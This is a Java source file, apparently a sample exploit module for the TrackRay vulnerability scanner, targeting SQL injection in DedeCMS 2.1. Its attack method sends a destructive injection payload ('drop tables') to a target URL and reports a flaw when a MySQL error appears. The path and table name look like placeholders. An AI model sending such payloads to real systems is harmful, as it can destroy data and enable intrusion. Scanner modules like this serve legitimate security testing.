package com.trackray.module.exploit;

import com.trackray.scanner.annotation.Exploit;
import com.trackray.scanner.bean.*;
import com.trackray.scanner.entity.FingerEntity;
import com.trackray.scanner.enums.Finger;
import com.trackray.scanner.enums.HttpMethod;
import com.trackray.scanner.enums.VulnLevel;
import com.trackray.scanner.enums.VulnType;
import com.trackray.scanner.exploit.AbstractExploit;
import com.trackray.scanner.utils.PageUtils;
import org.springframework.stereotype.Component;

import java.util.HashMap;
import java.util.List;
import java.util.Map;


@Exploit(value = "dedecmstest" , title = "DEDECMS 2.1 sql注入" , author = "blue", desc = "测试测试测试" )
public class DedecmsSQLi extends AbstractExploit {

    @Override
    public boolean check(Result result) {
        return true;
    }

    @Override
    public void init(Task task) {
        //..此方法可重写 也可以不用重写，主要用于初始化
    }

    @Override
    public List<Vulnerable> attack(Task task) {
        String target = task.getTargetStr();
        crawlerPage.getRequest().setUrl(target.concat("/123.php?id=1';drop tables xxx;--"));
        crawlerPage.getRequest().setHttpMethod(HttpMethod.GET);
        fetcher.run(crawlerPage);

        String content = PageUtils.getContent(crawlerPage);
        if (content.contains("mysql_error")) {
            add(new Vulnerable.VulnBuilder().message("存在dedecms漏洞")
                    .vulnType(VulnType.SQL_INJECTION)
                    .level(VulnLevel.DANGER).build());
        }
        return vulns();
    }

}
